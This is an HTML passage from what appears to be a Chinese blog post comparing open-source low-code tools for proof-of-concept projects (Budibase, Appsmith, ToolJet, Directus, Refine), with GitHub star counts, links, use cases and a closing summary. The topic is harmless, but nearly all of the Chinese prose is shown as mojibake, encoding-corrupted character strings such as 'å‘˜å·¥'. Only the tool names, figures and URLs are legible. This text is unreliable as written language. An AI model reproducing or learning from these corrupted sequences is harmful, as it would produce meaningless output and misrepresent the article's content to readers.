<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.docs.nocobase.com%2Fai-employees%2F" target="_blank" title="https://v2.docs.nocobase.com/ai-employees/" ref="nofollow noopener noreferrer">AI å‘˜å·¥</a></strong>ï¼šAI å‘˜å·¥åµŒå…¥ç³»ç»Ÿç•Œé¢ï¼Œå¯ä»¥è‡ªåŠ¨è¯»å–å½“å‰é¡µé¢çš„æ•°æ®æ¨¡å‹ä¸ç»“æ„ï¼Œå¹¶åœ¨å¯¹åº”ä½ç½®ç›´æ¥ååŠ©å®Œæˆå»ºæ¨¡ã€æ•°æ®å¤„ç†æˆ– JavaScript ç¼–å†™ç­‰ä»»åŠ¡ã€‚ åœ¨ PoC é˜¶æ®µï¼Œä½ å¯ä»¥å…ˆæ­å»ºæ ¸å¿ƒæ•°æ®æ¨¡å‹ä¸é¡µé¢æ¡†æ¶ï¼Œç„¶åç”¨ AI å‘˜å·¥è¾…åŠ©ç”Ÿæˆå­—æ®µå’Œåˆæ­¥å¸ƒå±€ï¼Œä»è€ŒèŠ‚çœåˆæ¬¡æ­å»ºçš„æ—¶é—´ï¼ŒæŠŠå›¢é˜Ÿç²¾åŠ›æ›´å¤šé›†ä¸­åœ¨éªŒè¯ä¸šåŠ¡æµç¨‹ä¸ç”¨æˆ·åœºæ™¯ä¸Šã€‚</li>
</ul>
<h2 data-id="heading-1">Budibase</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9739a3999a84cd8af1d0934d3f0a8a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=juYsBFKDzsljxxyLblEg1VVIFvg%3D" alt="Budibase.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBudibase%2Fbudibase" target="_blank" title="https://github.com/Budibase/budibase" ref="nofollow noopener noreferrer">github.com/Budibase/buâ€¦</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>27.3k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fbudibase.com%2F" target="_blank" title="https://budibase.com/" ref="nofollow noopener noreferrer">budibase.com/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.budibase.com%2Fdocs%2F" target="_blank" title="https://docs.budibase.com/docs/" ref="nofollow noopener noreferrer">docs.budibase.com/docs/</a></td></tr></tbody></table>
<p>Budibase æ˜¯ä¸€ä¸ªå¼€æºä½ä»£ç å¹³å°ï¼Œæä¾›å¯è‡ªæ‰˜ç®¡ã€å¯æ‰©å±•çš„å†…éƒ¨ç³»ç»ŸåŸºç¡€èƒ½åŠ›ï¼ŒåŒ…æ‹¬æ•°æ®è¿æ¥ã€ä¸šåŠ¡é€»è¾‘æ‰§è¡Œã€æƒé™é…ç½®ä¸è‡ªåŠ¨åŒ–å·¥ä½œæµã€‚</p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>æ„å»ºéœ€è¦æ•°æ®æŒä¹…åŒ–ã€è¡¨å•å¤„ç†ã€å®¡æ‰¹é“¾è·¯æˆ–åå°ç®¡ç†èƒ½åŠ›çš„ä¼ä¸šå†…éƒ¨åº”ç”¨ï¼Œå¦‚èµ„äº§ç®¡ç†ã€å‘˜å·¥æµç¨‹ã€å®¢æˆ·é—¨æˆ·ç­‰ã€‚</li>
<li>å½“ PoC éœ€è¦æ•´åˆå¤šä¸ªæ•°æ®æºï¼ˆPostgreSQLã€MySQLã€MongoDBã€REST API ç­‰ï¼‰ï¼Œå¹¶å¸Œæœ›åœ¨åŒä¸€å¹³å°å†…å®Œæˆæ•°æ®å±‚ã€é€»è¾‘å±‚ä¸è‡ªåŠ¨åŒ–ï¼Œè€Œä¸æ˜¯ä¾èµ–çº¯å‰ç«¯ä»£ç ç”Ÿæˆã€‚</li>
</ul>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>å¤šæ•°æ®æºä¸å¯è‡ªæ‰˜ç®¡èƒ½åŠ›</strong>ï¼šæ”¯æŒ PostgreSQLã€MySQLã€MongoDBã€REST API ç­‰è¿æ¥æ–¹å¼ï¼Œå¹¶å¯é€šè¿‡ Docker æˆ– Kubernetes è¿›è¡Œéƒ¨ç½²ï¼Œé€‚åˆéœ€è¦çœŸå®æ¨¡æ‹Ÿä¸šåŠ¡æ•°æ®ç»“æ„çš„ PoCã€‚</li>
<li><strong>ä¸šåŠ¡é€»è¾‘ä¸è‡ªåŠ¨åŒ–æµç¨‹</strong>ï¼šè‡ªå¸¦ Automations å·¥ä½œæµï¼Œå¯åœ¨æ•°æ®å˜æ›´ã€è§¦å‘äº‹ä»¶æˆ–å¤–éƒ¨ API è°ƒç”¨æ—¶æ‰§è¡Œé€»è¾‘ï¼Œè¿™éƒ¨åˆ†æ˜¯ PoC éªŒè¯ä¸šåŠ¡è§„åˆ™çš„å…³é”®èƒ½åŠ›ã€‚</li>
<li><strong>æƒé™ä¸è§’è‰²ä½“ç³»</strong>ï¼šæ”¯æŒç”¨æˆ·ã€è§’è‰²ã€èµ„æºçº§æƒé™ç®¡ç†ï¼Œåœ¨ PoC é˜¶æ®µå³å¯éªŒè¯çœŸå®çš„è®¿é—®æ§åˆ¶ä¸åˆ†å·¥æ¨¡å‹ã€‚</li>
</ul>
<p>ğŸ’¡é˜…è¯»æ›´å¤šï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-no-code-tools-supporting-postgresql" target="_blank" title="https://www.nocobase.com/cn/blog/6-no-code-tools-supporting-postgresql" ref="nofollow noopener noreferrer">PostgreSQL ç”¨æˆ·å¿…çœ‹ï¼š6 æ¬¾å¼ºå¤§çš„æ— ä»£ç å¹³å°æ¨è </a></p>
<h2 data-id="heading-2">Appsmith</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2b3b0db0b10428ebe3bf114ab8c7bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=np13CVF6Ck5CvCIItgpIzS4pe%2Bg%3D" alt="Appsmith.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fappsmithorg%2Fappsmith" target="_blank" title="https://github.com/appsmithorg/appsmith" ref="nofollow noopener noreferrer">github.com/appsmithorgâ€¦</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>38.5k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.appsmith.com%2F" target="_blank" title="https://www.appsmith.com/" ref="nofollow noopener noreferrer">www.appsmith.com/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.appsmith.com%2F" target="_blank" title="https://docs.appsmith.com/" ref="nofollow noopener noreferrer">docs.appsmith.com/</a></td></tr></tbody></table>
<p>Appsmith æ˜¯ä¸€ä¸ªå¼€æºä½ä»£ç å¹³å°ï¼Œé€‚åˆæ„å»ºéœ€è¦çœŸå®æ•°æ®äº¤äº’ã€ä¸šåŠ¡é€»è¾‘éªŒè¯ä¸å†…éƒ¨æ“ä½œæµç¨‹çš„åº”ç”¨ï¼Œæ”¯æŒå¤šç§æ•°æ®æºè¿æ¥ä¸è‡ªéƒ¨ç½²ã€‚</p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>æ„å»ºåŒ…å«è¡¨å•æ“ä½œã€æ•°æ®æŸ¥è¯¢ã€æ¥å£è°ƒç”¨ç­‰åŠŸèƒ½çš„å†…éƒ¨ç®¡ç†ç³»ç»Ÿï¼Œå¦‚å®¢æˆ·ç®¡ç†ã€è´¢åŠ¡æ“ä½œå°æˆ–è¿ç»´é¢æ¿ã€‚</li>
<li>éœ€è¦å°† PostgreSQLã€MySQLã€REST APIã€GraphQLã€Snowflake ç­‰å¤šç±»æ•°æ®æºæ•´åˆåœ¨åŒä¸€åº”ç”¨ä¸­ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œè¯»å†™ã€è½¬æ¢ä¸æ ¡éªŒã€‚</li>
<li>é€‚åˆéœ€è¦å¿«é€ŸéªŒè¯äº¤äº’é€»è¾‘ã€æ¥å£æµè½¬å’Œç”¨æˆ·æ“ä½œè·¯å¾„çš„å›¢é˜Ÿã€‚</li>
</ul>
<p>ğŸ’¡é˜…è¯»æ›´å¤šï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Frapid-development-platform" target="_blank" title="https://www.nocobase.com/cn/blog/rapid-development-platform" ref="nofollow noopener noreferrer">å›½å†…å¤–åå¤§å¼€æºå¿«é€Ÿå¼€å‘å¹³å°æ¨è</a></p>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>è„šæœ¬ä¸äº‹ä»¶é€»è¾‘çµæ´»</strong>ï¼šå¯åœ¨ç»„ä»¶äº‹ä»¶ä¸­ç¼–å†™ JavaScriptï¼Œç”¨äºå¤„ç†æ•°æ®è½¬æ¢ã€æ¡ä»¶åˆ¤æ–­ã€éªŒè¯è§„åˆ™æˆ– API è°ƒç”¨ï¼Œé€‚åˆåœ¨ PoC ä¸­æ¨¡æ‹ŸçœŸå®ä¸šåŠ¡æµã€‚</li>
<li><strong>æ•°æ®æºæ•´åˆèƒ½åŠ›æˆç†Ÿ</strong>ï¼šæä¾›ç»Ÿä¸€çš„ Query é¢æ¿ç®¡ç†æ•°æ®åº“æŸ¥è¯¢å’Œ API è°ƒç”¨ï¼Œèƒ½æ¸…æ™°å±•ç¤ºæ•°æ®æµå‘ï¼Œä¾¿äºè°ƒè¯•å’Œç‰ˆæœ¬åŒ–ç®¡ç†ã€‚</li>
<li><strong>æƒé™ä¸éƒ¨ç½²èƒ½åŠ›å®Œå–„</strong>ï¼šæ”¯æŒç”¨æˆ·è§’è‰²ã€èµ„æºçº§æƒé™ã€è‡ªæ‰˜ç®¡éƒ¨ç½²å’Œç¯å¢ƒå˜é‡é…ç½®ï¼Œæ–¹ä¾¿åœ¨ PoC é˜¶æ®µéªŒè¯å®‰å…¨æ¨¡å‹ä¸éƒ¨ç½²æ–¹å¼ã€‚</li>
<li><strong>AI Copilot</strong>ï¼šå¹³å°å†…ç½® Appsmith Copilotï¼Œå¯ååŠ©ç”ŸæˆæŸ¥è¯¢ã€æ•°æ®è½¬æ¢é€»è¾‘ä»¥åŠéƒ¨åˆ†ç»„ä»¶é…ç½®ï¼Œåœ¨åŸå‹é˜¶æ®µèƒ½å‡å°‘é‡å¤ç¼–è¾‘è„šæœ¬çš„æ—¶é—´ã€‚</li>
</ul>
<h2 data-id="heading-3">ToolJet</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14ab7c00714742c3b5828d156e0c176a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=BZuAG4eOmdApUTQTomJWIxeXf94%3D" alt="ToolJet.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FToolJet%2FToolJet" target="_blank" title="https://github.com/ToolJet/ToolJet" ref="nofollow noopener noreferrer">github.com/ToolJet/Tooâ€¦</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>36.9k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tooljet.com%2F" target="_blank" title="https://www.tooljet.com/" ref="nofollow noopener noreferrer">www.tooljet.com/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.tooljet.com%2Fdocs%2F" target="_blank" title="https://docs.tooljet.com/docs/" ref="nofollow noopener noreferrer">docs.tooljet.com/docs/</a></td></tr></tbody></table>
<p>ToolJet æ˜¯ä¸€ä¸ªå¼€æºä½ä»£ç å¹³å°ï¼Œé€‚åˆæ„å»ºå†…éƒ¨ç®¡ç†å·¥å…·ï¼Œæ”¯æŒå¤šæ•°æ®æºæ•´åˆã€è‡ªæ‰˜ç®¡éƒ¨ç½²å’Œè„šæœ¬åŒ–çš„ä¸šåŠ¡é€»è¾‘é…ç½®ã€‚</p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>æ„å»ºåŒ…å«è¡¨å•å¤„ç†ã€æ•°æ®å±•ç¤ºã€æ¥å£è°ƒç”¨å’Œä¸šåŠ¡æ“ä½œçš„å†…éƒ¨ç³»ç»Ÿï¼Œå¦‚åº“å­˜ç®¡ç†ã€å®¢æœåå°æˆ–è¿è¥æ§åˆ¶å°ã€‚</li>
<li>PoC éœ€è¦æ•´åˆæ•°æ®åº“ã€REST APIã€GraphQLã€Google Sheets æˆ–ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œè¯»å–ã€å†™å…¥ä¸æ ¡éªŒã€‚</li>
<li>é€‚ç”¨äºè‡ªæ‰˜ç®¡ç¯å¢ƒï¼Œå°¤å…¶æ˜¯æ¶‰åŠæ•æ„Ÿæ•°æ®æˆ–éœ€è¦æœ¬åœ°åŒ–éƒ¨ç½²çš„åœºæ™¯ã€‚</li>
</ul>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>çµæ´»çš„äº‹ä»¶ä¸åŠ¨ä½œé€»è¾‘</strong>ï¼šæ”¯æŒåœ¨ç»„ä»¶äº‹ä»¶ä¸­é…ç½®æ¡ä»¶åˆ¤æ–­ã€æ•°æ®åˆ·æ–°ã€æ¥å£è°ƒç”¨å’Œé¡µé¢é—´è·³è½¬ï¼Œé€‚åˆéªŒè¯ä¸šåŠ¡æµç¨‹çš„æµè½¬æ–¹å¼ã€‚</li>
<li><strong>å¤šæ•°æ®æºé›†æˆèƒ½åŠ›</strong>ï¼šæ”¯æŒ PostgreSQLã€MySQLã€MongoDBã€Snowflakeã€RESTã€GraphQL ç­‰å¸¸è§æ•°æ®æºï¼Œèƒ½å¿«é€Ÿå»ºç«‹å®Œæ•´çš„æ•°æ®äº¤äº’é“¾è·¯ã€‚</li>
<li><strong>è‡ªéƒ¨ç½²ä¸ç¯å¢ƒç®¡ç†</strong>ï¼šæä¾› Dockerã€Kubernetes ç­‰éƒ¨ç½²æ–¹æ¡ˆï¼Œå¯åœ¨ä¼ä¸šå†…éƒ¨ç¯å¢ƒç¨³å®šè¿è¡Œï¼Œé€‚ç”¨äºéœ€è¦æœ¬åœ°åŒ– PoC çš„å›¢é˜Ÿã€‚</li>
</ul>
<h2 data-id="heading-4">Directus</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/683bd23b24c2411fac9c58cf312b1d16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=j9uZiS5xanXKVo7BEcIMe4oJl1Q%3D" alt="Directus-b0idpv.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdirectus%2Fdirectus" target="_blank" title="https://github.com/directus/directus" ref="nofollow noopener noreferrer">github.com/directus/diâ€¦</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>33.5k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdirectus.io%2F" target="_blank" title="https://directus.io/" ref="nofollow noopener noreferrer">directus.io/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.directus.io%2F" target="_blank" title="https://docs.directus.io/" ref="nofollow noopener noreferrer">docs.directus.io/</a></td></tr></tbody></table>
<p>Directus æ˜¯ä¸€ä¸ªå¼€æºçš„åç«¯æ•°æ®å¹³å°ï¼Œå¯å°†ä»»ä½•æ•°æ®åº“å³æ—¶è½¬æ¢ä¸º API å’Œå¯ç®¡ç†çš„å†…å®¹ç•Œé¢ï¼Œé€‚åˆæ„å»ºæ•°æ®é©±åŠ¨çš„åº”ç”¨åŸå‹ä¸å†…éƒ¨ç³»ç»Ÿã€‚</p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>å½“ä½ çš„ PoC ä¸»è¦å›´ç»•æ•°æ®ç»“æ„ã€å†…å®¹ç®¡ç†æˆ–æ•°æ®æœåŠ¡å±•å¼€ï¼Œå¸Œæœ›å¿«é€Ÿæ­å»ºä¸€ä¸ªèƒ½ç®¡ç†æ•°æ®ã€å®šä¹‰å…³ç³»å¹¶æä¾›æ ‡å‡†åŒ– API çš„åç«¯ã€‚</li>
<li>é€‚åˆéœ€è¦çµæ´»è¯»å–ã€ç¼–è¾‘ã€å±•ç¤ºæ•°æ®åº“å†…å®¹çš„åœºæ™¯ï¼Œä¾‹å¦‚å†…å®¹åå°ã€é…ç½®ä¸­å¿ƒã€æ•°æ®ç®¡ç†ç³»ç»Ÿæˆ–éœ€è¦ä¸ºå‰ç«¯å¿«é€Ÿæä¾› API çš„åŸå‹é¡¹ç›®ã€‚</li>
<li>æ•°æ®åº“å·²å­˜åœ¨ï¼Œæˆ– PoC é˜¶æ®µå¸Œæœ›ä»¥å¯æ§æ–¹å¼å®šä¹‰æ•°æ®æ¨¡å‹ï¼Œå¹¶ä¸ºå‰ç«¯ã€ç§»åŠ¨ç«¯æˆ–å…¶ä»–æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£æ—¶ã€‚</li>
</ul>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>æ•°æ®åº“ç›´è¿ä¸å³å¼€å³ç”¨ API</strong>ï¼šDirectus èƒ½ç›´æ¥è¿æ¥ç°æœ‰æ•°æ®åº“ï¼ˆPostgreSQLã€MySQLã€SQLite ç­‰ï¼‰ï¼Œæ— éœ€è¿ç§»å³å¯ç”Ÿæˆ REST ä¸ GraphQL APIã€‚PoC é˜¶æ®µå¯ä»¥ç›´æ¥å€Ÿç”¨å·²æœ‰è¡¨ç»“æ„ï¼Œå¤§å¹…å‡å°‘åç«¯å¼€å‘æ—¶é—´ã€‚</li>
<li><strong>å¯è§†åŒ–å†…å®¹ç®¡ç†ç•Œé¢</strong>ï¼šè‡ªåŠ¨ç”Ÿæˆçš„ç®¡ç†åå°å¯ç”¨äºæ•°æ®å½•å…¥ã€å…³è”é…ç½®å’Œå†…å®¹è¿è¥ï¼Œé€‚åˆå¿«é€ŸéªŒè¯æ•°æ®ç»“æ„æ˜¯å¦åˆç†ã€‚å»ºè®®åœ¨ PoC æ—¶ä½¿ç”¨ Collections å’Œ Fields å»æ„å»ºæœ€å°çš„æ•°æ®éª¨æ¶ï¼Œå†é€æ­¥ç»†åŒ–ã€‚</li>
<li><strong>æƒé™ä¸å·¥ä½œæµæœºåˆ¶</strong>ï¼šå†…ç½®è§’è‰²ä¸æƒé™ç®¡ç†ï¼Œå¯¹äºéœ€è¦å¤šè§’è‰²å‚ä¸çš„ PoCï¼Œå¯ä»¥ç”¨æœ€å°é…ç½®è·‘é€šæƒé™æ¨¡å‹ã€‚</li>
</ul>
<h2 data-id="heading-5">Refine</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6b5db54cbe04bca86782d391e65de16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=qn%2BVkxys%2B70UCi%2BqQOSZefcs1LU%3D" alt="Refine.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frefinedev%2Frefine" target="_blank" title="https://github.com/refinedev/refine" ref="nofollow noopener noreferrer">github.com/refinedev/râ€¦</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>33.3k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Frefine.dev%2F" target="_blank" title="https://refine.dev/" ref="nofollow noopener noreferrer">refine.dev/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Frefine.dev%2Fdocs%2F" target="_blank" title="https://refine.dev/docs/" ref="nofollow noopener noreferrer">refine.dev/docs/</a></td></tr></tbody></table>
<p>Refine æ˜¯ä¸€ä¸ªå¼€æºçš„ React åº”ç”¨æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿæ„å»ºæ•°æ®å¯†é›†å‹çš„åå°ç³»ç»Ÿã€ç®¡ç†é¢æ¿ä¸å†…éƒ¨å·¥å…·ï¼Œæä¾›å¯æ‰©å±•çš„å‰ç«¯æ¶æ„ä¸ä¸°å¯Œçš„é›†æˆèƒ½åŠ›ã€‚</p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>å½“ä½ å¸Œæœ›åœ¨ä¿æŒ React æŠ€æœ¯æ ˆçš„å‰æä¸‹ï¼Œå¿«é€Ÿæ­å»ºä¸€ä¸ªå¸¦ç•Œé¢ã€è·¯ç”±ã€æ•°æ®æ“ä½œå’Œæƒé™ç»“æ„çš„ç®¡ç†åå°ï¼Œä¾‹å¦‚è®¢å•ç®¡ç†ã€å†…å®¹ç®¡ç†ã€CRM æˆ–è¿è¥æ§åˆ¶å°ã€‚</li>
<li>é€‚åˆæƒ³åœ¨ PoC é˜¶æ®µå¿«é€Ÿäº§å‡ºå¯è¿è¡Œç•Œé¢ï¼ŒåŒæ—¶ä¿ç•™ä»£ç çµæ´»åº¦çš„å›¢é˜Ÿï¼›ç‰¹åˆ«æ˜¯å·²ç»æœ‰æœ‰å‰ç«¯å¼€å‘è€…çš„åœºæ™¯ã€‚</li>
<li>å½“ç³»ç»Ÿéœ€è¦è¿æ¥ RESTã€GraphQLã€NestJSã€Supabaseã€Firebase æˆ–ç°æœ‰çš„å†…éƒ¨ APIï¼Œå¹¶åœ¨ä¸€ä¸ªé€šç”¨æ¡†æ¶ä¸‹ç®¡ç†åˆ—è¡¨ã€è¡¨å•ã€è¯¦æƒ…é¡µç­‰å¸¸è§æ¨¡å¼ã€‚</li>
</ul>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>React å…ƒæ¡†æ¶ä¸è‡ªåŠ¨åŒ–æ¨¡å¼</strong>ï¼šRefine æä¾›åˆ—è¡¨ã€è¡¨å•ã€ç¼–è¾‘ã€è¯¦æƒ…ç­‰å…¸å‹åå°é¡µé¢çš„é¢„è®¾é€»è¾‘ï¼Œå‡å°‘é‡å¤æ€§ä»£ç ã€‚PoC é˜¶æ®µå¯ç›´æ¥ä½¿ç”¨å…¶å†…ç½®çš„ CRUD æ¨¡å¼ä¸èµ„æºï¼ˆResourceï¼‰æœºåˆ¶ï¼Œç”¨æå°‘ä»£ç è·‘é€šä¸»è¦ä¸šåŠ¡æµã€‚</li>
<li><strong>çµæ´»çš„æ•°æ®ä¸æƒé™é›†æˆ</strong>ï¼šæ”¯æŒå¤šç§æ•°æ®æºä¸è®¤è¯æ–¹å¼ï¼Œæ— éœ€å¼ºåˆ¶ç»‘å®šç‰¹å®šæŠ€æœ¯æ ˆã€‚å»ºè®®åœ¨ PoC ä¸­å…ˆå®šä¹‰æ ¸å¿ƒèµ„æºï¼ˆå¦‚ customersã€ordersï¼‰ï¼Œå†é€šè¿‡ hooks å®Œæˆæœ€å°å¯ç”¨çš„è¯»å†™æ“ä½œã€‚</li>
<li><strong>Refine AI</strong>ï¼šå¯ä»¥åœ¨ç¼–è¾‘ç•Œé¢æˆ–é€»è¾‘ä¸­æä¾›ä»£ç å»ºè®®ã€ç”ŸæˆçŠ¶æ€å¤„ç†å‡½æ•°æˆ–é¡µé¢æ¨¡æ¿ï¼Œé€‚åˆåœ¨ PoC é˜¶æ®µå‡å°‘å‰ç«¯çš„æ­å»ºæ—¶é—´ã€‚</li>
</ul>
<h2 data-id="heading-6"><strong>ç»“è¯­</strong></h2>
<p>è¿™å…­ä¸ªå¼€æºå·¥å…·åœ¨ PoC åœºæ™¯ä¸­ä¾§é‡ç‚¹ä¸åŒï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚å¿«é€Ÿåšå‡ºåˆ¤æ–­ï¼š</p>
<ul>
<li>éœ€è¦å®Œæ•´çš„ä¸šåŠ¡ç³»ç»Ÿèƒ½åŠ›ï¼ˆæ¨¡å‹ã€ç•Œé¢ã€å·¥ä½œæµï¼‰ï¼šNocoBase / Budibase</li>
<li>éœ€è¦æ•°æ®äº¤äº’ã€è„šæœ¬é€»è¾‘ä¸çœŸå®ä¸šåŠ¡æµéªŒè¯ï¼šAppsmith / ToolJet</li>
<li>éœ€è¦æ ‡å‡†åŒ– APIã€å†…å®¹ç®¡ç†æˆ–æ•°æ®æœåŠ¡ï¼šDirectus</li>
<li>éœ€è¦åœ¨ React æŠ€æœ¯æ ˆä¸‹å…¼å…·é€Ÿåº¦ä¸çµæ´»æ€§ï¼šRefine</li>
</ul>
<p>éšç€ AI åœ¨ç•Œé¢ç”Ÿæˆå’Œéƒ¨åˆ†å¼€å‘ç¯èŠ‚ä¸­æä¾›äº†æ›´é«˜çš„æ•ˆç‡ï¼Œè®¸å¤šæ— ä»£ç å’Œä½ä»£ç å·¥å…·ä¹Ÿå¼€å§‹åŠ å…¥é€‚åº¦çš„ AI è¾…åŠ©èƒ½åŠ›ã€‚PoC çš„æ ¸å¿ƒä»ç„¶åœ¨äºå¿«é€ŸéªŒè¯æ€è·¯è€Œéæ„å»ºå®Œå¤‡ç³»ç»Ÿï¼Œé€‰æ‹©ä¸éªŒè¯ç‚¹è´´è¿‘çš„å·¥å…·ï¼Œå¹¶åœ¨éœ€è¦æ—¶åˆ©ç”¨è¿™äº›è¾…åŠ©èƒ½åŠ›ï¼Œå°±èƒ½ä»¥æ›´ä½æˆæœ¬ã€æ›´çŸ­å‘¨æœŸè·‘é€šå…³é”®æµç¨‹ï¼Œè®©å›¢é˜Ÿå°†ç²¾åŠ›é›†ä¸­åœ¨çœŸæ­£å½±å“åˆ¤æ–­çš„éƒ¨åˆ†ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œä¹Ÿæ¬¢è¿åˆ†äº«ç»™æœ‰ Poc éœ€æ±‚çš„æœ‹å‹ã€‚</p>
<p>ç›¸å…³é˜…è¯»ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fa-developers-technical-decision-guide-to-no-code-and-low-code" target="_blank" title="https://www.nocobase.com/cn/blog/a-developers-technical-decision-guide-to-no-code-and-low-code" ref="nofollow noopener noreferrer">ç»™å¼€å‘è€…çš„æ— ä»£ç /ä½ä»£ç æŠ€æœ¯å†³ç­–æŒ‡å—ï¼ˆ2026ï¼‰</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-in-depth-comparison-rbac-no-code-low-code-platforms" target="_blank" title="https://www.nocobase.com/cn/blog/6-in-depth-comparison-rbac-no-code-low-code-platforms" ref="nofollow noopener noreferrer">6 å¤§ä¼ä¸šçº§æ— ä»£ç ä½ä»£ç å¹³å° RBAC æƒé™ä½“ç³»æ·±åº¦å¯¹æ¯”</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F14-ai-low-code-platforms-github" target="_blank" title="https://www.nocobase.com/cn/blog/14-ai-low-code-platforms-github" ref="nofollow noopener noreferrer">GitHub ä¸Šæœ€å€¼å¾—å…³æ³¨çš„ 14 ä¸ªå¼€æº AI ä½ä»£ç å·¥å…· </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Ftop-11-github-open-source-no-code-ai-tools" target="_blank" title="https://www.nocobase.com/cn/blog/top-11-github-open-source-no-code-ai-tools" ref="nofollow noopener noreferrer">11 ä¸ªåœ¨ GitHub ä¸Šæœ€å—æ¬¢è¿çš„å¼€æºæ— ä»£ç  AI å·¥å…· </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-ai-agent-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-ai-agent-projects" ref="nofollow noopener noreferrer">GitHub ä¸Š Star æ•°é‡å‰ 18 çš„å¼€æº AI Agent é¡¹ç›®</a></li>
